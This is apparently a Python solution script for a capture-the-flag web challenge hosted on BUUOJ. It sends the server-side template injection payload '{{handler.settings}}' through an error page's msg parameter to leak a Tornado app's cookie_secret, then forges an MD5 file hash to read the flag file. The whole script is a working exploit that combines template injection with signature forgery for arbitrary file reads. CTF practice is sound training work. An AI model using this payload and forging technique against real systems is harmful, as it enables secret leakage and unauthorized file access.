import ast
import requests
from hashlib import md5
from bs4 import BeautifulSoup

url = 'http://62002d18-8984-40cd-afd1-1de9523c39d9.node4.buuoj.cn:81/'
response = requests.get(url=url+'error?msg={{handler.settings}}')
if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')
    cookie_secret = ast.literal_eval(soup.body.contents[0])['cookie_secret']
    print('cookie_secret:'+cookie_secret)
else:
    print('Get cookie_secret error!')

filename = '/fllllllllllllag'
tmp = md5(filename.encode()).hexdigest() 
filehash = md5((cookie_secret+tmp).encode()).hexdigest()
print('filehash:'+filehash)
response = requests.get(url+'file?filename={}&filehash={}'.format(filename, filehash))
if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')
    flag = soup.contents[2]
    print('flag:'+flag)
else:
    print('Get flag error!')